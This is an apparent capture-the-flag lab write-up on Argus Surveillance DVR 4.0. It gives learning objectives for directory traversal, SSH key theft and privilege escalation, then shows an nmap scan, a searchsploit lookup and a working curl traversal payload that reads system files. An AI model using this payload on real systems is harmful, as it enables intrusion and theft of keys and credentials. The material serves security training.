A foothold on the target system will be established by exploiting a directory traversal vulnerability in the DVR software to access an SSH key. Privileges will then be elevated by decoding the Administrator password found in a configuration file. This lab focuses on exploiting vulnerabilities and privilege escalation methods.

# Summary

This lab demonstrates exploiting a Directory Traversal vulnerability in Argus Surveillance DVR 4.0 to access sensitive files, such as SSH private keys and configuration files. Learners will decode the Administrator password using a substitution cipher, then gain elevated privileges by launching a reverse shell through runas with the recovered credentials. The lab emphasizes file inclusion attacks, custom encryption decoding, and privilege escalation through administrative utilities.

# Learning Objectives

**After completion of this lab, learners will be able to:**

- Enumerate the web application and identify the Directory Traversal vulnerability.
- Exploit the vulnerability to retrieve the SSH private key and gain initial access as a low-privileged user.
- Locate the Argus configuration file and extract the encoded Administrator password.
- Decode the password using a substitution cipher script provided in the exploit database.
- Launch a reverse shell as Administrator by using runas and validate SYSTEM-level access.

-------

alright. let's get crackin.


	sudo nano /etc/hosts
	nmap DVR4


```
???(kali?kali)-[~]
??$ nmap DVR4
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-12 01:50 +0000
Nmap scan report for DVR4 (192.168.53.179)
Host is up (0.00055s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 17.79 seconds

```

http://dvr4:8080/

now to find out what version it's running.

 Version: 4.0
Released 18/12/2008 

```sh

searchsploit Argus


# Argus Surveillance DVR 4.0.0.0 - Directory Traversal | windows_x86/webapps/45296.txt

searchsploit -p 45296

cp /usr/share/exploitdb/exploits/windows_x86/webapps/45296.txt ./


curl "http://VICTIM-IP:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="

```